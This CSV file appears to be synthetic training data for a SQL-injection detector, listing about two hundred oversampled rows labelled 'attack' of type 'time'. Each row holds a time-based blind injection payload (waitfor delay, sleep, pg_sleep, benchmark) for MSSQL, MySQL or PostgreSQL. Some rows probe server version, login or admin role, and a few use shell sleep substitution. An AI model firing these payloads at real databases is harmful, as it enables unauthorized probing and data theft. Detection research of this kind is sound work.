id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001615,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.141873616641138
SMOTE_001616,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,2.2260420991115617
SMOTE_001617,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.6294318010848713
SMOTE_001618,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.049470931350445
SMOTE_001619,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.009026611687461134
SMOTE_001620,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.0030384351102222132
SMOTE_001621,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.1795704709398464
SMOTE_001622,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.7964318958956915
SMOTE_001623,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.0080351987251244
SMOTE_001624,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.8281391508829907
SMOTE_001625,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.21178031221354113
SMOTE_001626,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,2.1084766800809285
SMOTE_001627,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,1.6022532826424207
SMOTE_001628,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.06681039497797764
SMOTE_001629,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.1547713371833117
SMOTE_001630,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.32703490172144556
SMOTE_001631,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.526595235861763
SMOTE_001632,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.276930461752726
SMOTE_001633,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.06915350864465614
SMOTE_001634,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.9424666805410649
SMOTE_001635,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,2.2781409456658444
SMOTE_001636,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.14673701949275997
SMOTE_001637,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.09794047974028315
SMOTE_001638,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.8704850942318256
SMOTE_001639,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.3176196330019447
SMOTE_001640,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.791589721755996
SMOTE_001641,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.6732477426834451
SMOTE_001642,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.7335830206579947
SMOTE_001643,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.006249929325677519
SMOTE_001644,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.5771606955903101
SMOTE_001645,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.4774245813187886
SMOTE_001646,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.6045092929081533
SMOTE_001647,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.005543446116168
SMOTE_001648,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.38116436876839077
SMOTE_001649,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,4.43828184385944
SMOTE_001650,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.3068520638018357
SMOTE_001651,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.0735843182270626
SMOTE_001652,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.1573900535775733
SMOTE_001653,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.8727849251109084
SMOTE_001654,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.33392800136364337
SMOTE_001655,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.39301698921068895
SMOTE_001656,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.2065928575839204
SMOTE_001657,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.07834137238912676
SMOTE_001658,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.2527981502233851
SMOTE_001659,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,2.575184910482061
SMOTE_001660,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.7759901583347962
SMOTE_001661,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.028825167179423485
SMOTE_001662,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.872393362501055
SMOTE_001663,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.581099783718294
SMOTE_001664,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.9322700766491903
SMOTE_001665,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,4.312267108221103
SMOTE_001666,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.470060298672514
SMOTE_001667,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.18648712392319808
SMOTE_001668,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.306642109706755
SMOTE_001669,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.8690160526066785
SMOTE_001670,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.2909453844783505
SMOTE_001671,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.3698347581909144
SMOTE_001672,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.6650112012879474
SMOTE_001673,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.004348614018808619
SMOTE_001674,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,1.0494641842541643
SMOTE_001675,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.3153459582138282
SMOTE_001676,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.853888498286833
SMOTE_001677,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,2.342440457031826
SMOTE_001678,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.07763625819580107
SMOTE_001679,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.6162733849203565
SMOTE_001680,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.2075341353834064
SMOTE_001681,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.22365190241537306
SMOTE_001682,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0
SMOTE_001683,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.34254287749524187
SMOTE_001684,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.8731313328250816
SMOTE_001685,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.7354866432563019
SMOTE_001686,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.4341097660601883
SMOTE_001687,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.2787698264085761
SMOTE_001688,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.3428137211543654
SMOTE_001689,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.8195289746730776
SMOTE_001690,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.391569268838139
SMOTE_001691,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.2252096934824663
SMOTE_001692,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.5332090310014193
SMOTE_001693,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.9776069461524061
SMOTE_001694,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.8202341330958907
SMOTE_001695,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.6631557038735325
SMOTE_001696,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,1.0196198141864095
SMOTE_001697,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,1.2523180214226193
SMOTE_001698,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.7006808677761651
SMOTE_001699,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.00036348726478163483
SMOTE_001700,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.8362599687430283
SMOTE_001701,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.8697458061769274
SMOTE_001702,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.3203398227883274
SMOTE_001703,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.7137781309209505
SMOTE_001704,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.4739715222256098
SMOTE_001705,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.7801090829904862
SMOTE_001706,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.4948996881173433
SMOTE_001707,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.9376513480904667
SMOTE_001708,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.8679978713764253
SMOTE_001709,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0033876891143384243
SMOTE_001710,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.4179426408551745
SMOTE_001711,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.1894792603528382
SMOTE_001712,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.564931300985893
SMOTE_001713,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.060435278336909856
SMOTE_001714,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.6641126416628031
SMOTE_001715,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.08032275538745423
SMOTE_001716,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.2188524099673088
SMOTE_001717,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.006635779987754005
SMOTE_001718,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.6280581624505988
SMOTE_001719,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,1.363392875576963
SMOTE_001720,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.009521063911632705
SMOTE_001721,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,2.2560540211285454
SMOTE_001722,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.772108175413309
SMOTE_001723,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0009475219055344843
SMOTE_001724,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,3.242841030184177
SMOTE_001725,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.495021391674409
SMOTE_001726,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.5359071701535914
SMOTE_001727,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.2394759579090562
SMOTE_001728,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.6107313735442379
SMOTE_001729,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.4114859378373477
SMOTE_001730,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.15926000603929016
SMOTE_001731,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.26179753757685253
SMOTE_001732,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.2887418286969177
SMOTE_001733,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.4409398948171933
SMOTE_001734,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.1953072333577855
SMOTE_001735,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0021821903085402308
SMOTE_001736,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.978892663250031
SMOTE_001737,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,1.6248964261832044
SMOTE_001738,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.630963107251819
SMOTE_001739,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.7573758193310063
SMOTE_001740,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,1.0623401011263196
SMOTE_001741,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.664905949317287
SMOTE_001742,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.2835910164584326
SMOTE_001743,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.001291357374365131
SMOTE_001744,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.8652524752202566
SMOTE_001745,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.5411973197814708
SMOTE_001746,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.271037210787958
SMOTE_001747,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.18270476075008849
SMOTE_001748,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.2542327168537988
SMOTE_001749,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.3472004309990704
SMOTE_001750,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,2.6403157405580115
SMOTE_001751,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.004768927556646577
SMOTE_001752,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.36945889982589164
SMOTE_001753,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.2600393849755977
SMOTE_001754,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.005868501548579703
SMOTE_001755,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.630478391570597
SMOTE_001756,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.003829064605203277
SMOTE_001757,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.0617283919352964
SMOTE_001758,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.280047662769336
SMOTE_001759,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.3324611125909644
SMOTE_001760,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.235185473521969
SMOTE_001761,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.5844307860385374
SMOTE_001762,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.5021603635025138
SMOTE_001763,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,2.2305273913230947
SMOTE_001764,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.9609937570509515
SMOTE_001765,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.077217791937035
SMOTE_001766,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.0055085152043093
SMOTE_001767,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.6741166904839275
SMOTE_001768,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.4031378686355665
SMOTE_001769,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.6265926750794184
SMOTE_001770,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.0306970456018627
SMOTE_001771,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.9626112302150345
SMOTE_001772,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.136354802140692
SMOTE_001773,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.5333663884288218
SMOTE_001774,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.4648158469267469
SMOTE_001775,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.052829891346971
SMOTE_001776,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.07978517250775961
SMOTE_001777,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.6097183308417069
SMOTE_001778,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.22779510652511686
SMOTE_001779,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.3890122121520098
SMOTE_001780,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.48798013052051126
SMOTE_001781,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.003623638603291486
SMOTE_001782,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.2649442527232853
SMOTE_001783,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.5390399216341352
SMOTE_001784,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.004953271652514094
SMOTE_001785,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.4467589371909662
SMOTE_001786,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.7532744541024954
SMOTE_001787,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.2475056646063598
SMOTE_001788,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,1.4802174914611543
SMOTE_001789,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.3084149175961718
SMOTE_001790,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,2.5799934042789667
SMOTE_001791,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.1237667229336951
SMOTE_001792,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.5736703037382024
SMOTE_001793,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.23828157081664483
SMOTE_001794,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.7579885550230743
SMOTE_001795,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.001118409788589862
SMOTE_001796,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.2711132858084799
SMOTE_001797,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.7137068799020709
SMOTE_001798,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.847217207217015
SMOTE_001799,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.4571541706482702
SMOTE_001800,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.572672254677627
SMOTE_001801,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.9718787205541696
SMOTE_001802,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.1129569786051663
SMOTE_001803,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,1.344503743301247
SMOTE_001804,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.010120485476362512
SMOTE_001805,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.003054279502320143
SMOTE_001806,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.152138518758338
SMOTE_001807,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.44201078929044746
SMOTE_001808,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.8498480680372605
SMOTE_001809,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.371093926538687
SMOTE_001810,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.4372699136974363
SMOTE_001811,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.432164090140881
SMOTE_001812,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.07966247196989494
SMOTE_001813,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.3191763900102252
SMOTE_001814,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.373439975949424
SMOTE_001815,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.3701000714629015
SMOTE_001816,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.886520226501602
SMOTE_001817,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.15990507893382827
SMOTE_001818,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.8116473374577635
SMOTE_001819,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.8558411436623896
SMOTE_001820,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.686377899491482
SMOTE_001821,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,1.06263519328179
